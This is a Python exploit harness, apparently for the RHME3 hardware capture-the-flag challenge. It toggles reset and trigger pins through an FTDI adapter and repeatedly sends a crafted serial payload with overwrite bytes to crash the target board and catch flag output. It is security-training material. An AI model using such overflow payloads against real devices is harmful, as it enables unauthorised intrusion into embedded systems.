from pyftdi.gpio import GpioController, GpioException
from time import sleep
import time
import sys
import serial
import bitstring
import hmac
import hashlib
import binascii

bitbang = GpioController()
bitbang.open_from_url('ftdi:///1')

ser = serial.Serial('/dev/ttyUSB0', 115200, timeout=None)

state = 0

def pin_output(line):
    bitbang.set_direction(1 << line, 1 << line)
    return

def pin_input(line):
    bitbang.set_direction(1 << line, 0)
    return

def pin_high(line):
    global state
    state = state | (1 << line)
    bitbang.write_port(state)
    return

def pin_low(line):
    global state
    state = state & ~(1 << line)
    bitbang.write_port(state)
    return

def set_pin(line, val):
    if val:
        pin_high(line)
    else:
        pin_low(line)

def get_pin(line):
    state = bitbang.read_port()
    return bool(state & (1 << line))

#     Name | MPSSE # | MPSSE Color | RHME3 Pin
RESET      = 4       # GREY        | RESET
TRIG_OUT   = 5       # PURPLE      | N/A

def log(message):
   print(message)
   with open('send_crash.log', 'a') as log_file:
      log_file.write(str(message))
      log_file.write('\n')
   return

def read_until(prompt_char):
   global ser
   res = b''
   char = ser.read(1)
   res = res + char
   while char != prompt_char:
       char = ser.read(1)
       res = res + char
   return res

def get_any_serial():
    global ser
    res = b''
    count = ser.in_waiting
    if count > 0:
        res = res + ser.read(count)
    return res

def print_any_serial():
   line = get_any_serial()
   if not line == b'':
      log(line)
      sys.stdout.flush()
   return line

def release_reset_and_wait():
    global ser

    print("Resetting Target...")
    pin_low(RESET)
    sleep(0.010)
    pin_high(RESET)
    log(read_until(b'>'))
    return

Y_CRASH = b'0123456789abcd' + b'stuvwxyz' + binascii.unhexlify("3ffa0002ba") + b'\n'
N_CRASH = b'01234' + b'\n'

def go(armed=True, crash=True):
   release_reset_and_wait()

   if armed: pin_high(TRIG_OUT)

   if crash: ser.write(Y_CRASH)
   else:     ser.write(N_CRASH)

   sleep(0.100)
   output = print_any_serial()
   if b'flag' in output:
      log("****FLAG*******************************************************")

   if armed: pin_low(TRIG_OUT)
   sleep(0.500)

   return

pin_output(RESET)
pin_high(RESET)

pin_low(TRIG_OUT)
pin_output(TRIG_OUT)

count = 0
while True:
   sys.stdout.write("%d " % count)
#   go(crash=True,  armed=False)
#   go(crash=False, armed=False)
   go(crash=True,  armed=True)
   count = count + 1

